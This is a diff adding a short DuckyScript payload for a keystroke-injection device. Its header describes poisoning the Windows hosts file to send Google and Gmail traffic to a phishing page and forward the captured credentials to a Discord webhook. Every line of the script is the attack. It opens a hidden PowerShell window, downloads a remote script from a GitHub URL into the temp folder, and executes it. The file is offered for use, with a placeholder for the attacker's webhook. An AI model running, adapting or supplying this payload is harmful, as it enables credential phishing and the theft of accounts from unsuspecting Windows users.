@@ -1,0 +1,15 @@
+REM Title: Voice2Discord
+REM Author: Oscar R.C. Based on I'm Jackoby VoiceLogger
+REM Description: Poisons the hosts file to redirect google.com and gmail.com request to a phishing page exfiltrating the credentials to Discord
+REM Usage: Add your discord hook where it says ENTER_DISCORD_HOOK_HERE
+REM Target: Windows 10, 11
+
+GUI r
+DELAY 500
+STRING CMD
+ENTER
+DELAY 500
+STRING powershell.exe -windowstyle hidden -command "$Hook='ENTER_DISCORD_HOOK_HERE';Invoke-RestMethod https://raw.githubusercontent.com/Agente404/flipper/main/payloads/GooglePhishing2Discord/script.ps1 -OutFile ($env:temp+'\gph.ps1');Invoke-Expression ($env:temp+'\gph.ps1');"
+ENTER
+STRING exit
+ENTER
